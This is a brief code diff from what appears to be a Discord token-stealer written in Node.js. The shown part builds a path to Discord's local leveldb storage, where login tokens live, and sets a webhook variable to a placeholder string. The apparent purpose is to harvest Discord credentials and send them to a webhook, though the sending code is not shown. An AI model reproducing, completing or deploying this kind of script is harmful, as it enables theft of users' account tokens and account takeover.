@@ -2,7 +2,7 @@ const fs = require('fs')
 const axios = require('axios')
 const fetch = require('node-fetch')
 
-var webhook = ""
+var webhook = "boobs"
 
 var paths = [
     `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
